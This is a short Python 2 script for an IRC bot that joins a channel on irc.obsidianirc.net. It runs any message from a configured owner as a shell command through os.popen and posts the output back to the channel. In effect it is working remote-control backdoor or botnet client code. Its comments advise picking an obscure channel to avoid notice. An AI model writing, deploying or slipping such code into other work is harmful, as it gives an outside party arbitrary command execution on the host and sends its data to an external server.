import sys
import socket
import string
import os
import random

HOST='irc.obsidianirc.net'  # You can use any service however, my code has only been tested with freenode
PORT=6667
NICK='BigData'+str(random.randint(1, 1000)) # You can name it whatever you want.
REALNAME = IDENT = "Something"+NICK

OWNER='abcdefg' # Change this to your username

CHANNELINIT='#test' #Rename this to something that people wont join to. To limit noise by other people
readbuffer=''

def parsemsg(msg):
    wasDirected = 0
    complete=msg[1:].split(':',1)
    info=complete[0].split(' ')
    msgpart=complete[1]
    sender=info[0].split('!')
    cmd = ''
    if sender[0]==OWNER:
        cmd=msgpart
    if cmd != '':
        cmd = cmd.split()
        if '@' in cmd[0]:
            wasDirected = 1
            if cmd[0].replace('@','') not in NICK:
                return
        cmd = ' '.join(cmd[wasDirected:])
        commandOutput = os.popen(cmd).read()
        if commandOutput != '':
            commandOutput = commandOutput.split()
            s.send( 'PRIVMSG '+CHANNELINIT+' :'+str(commandOutput)+'\r\n' );


s=socket.socket( )
s.connect((HOST, PORT))
s.send('NICK '+NICK+'\r\n')
s.send('USER '+IDENT+' '+HOST+' bla :'+REALNAME+'\r\n')

import time

f = open('out','wb+')
start_t = time.time()
start = False
while time.time()-start_t<300:
    line=s.recv(20000)
    if len(line)>0:
        f.write("received "+str(len(line))+" : "+line+'\n')
        f.flush()
    if line.find('Welcome ')!=-1:
        s.send('JOIN '+CHANNELINIT+'\r\n')
        f.write('JOINED !')
        f.flush()
        s.send('PRIVMSG '+CHANNELINIT+' :HELLLOOOOW\r\n')
        f.write('PRIVMSG sent !')
        f.flush()
        start = True
    elif start:
        if line.find(OWNER)!=-1:
            f.write('COMMAND received !!! ')
            f.flush()
            line=line.rstrip()
            parsemsg(line)

    if(line.find('PING')!=-1):
        pongData = line.split(':', 1)
        pongData = pongData[1].split(' ')
        s.send('PONG '+pongData[0]+'\r\n')
        f.write('PONG sent !')
        f.flush()

s.send('QUIT :lol pourquoi\r\n')
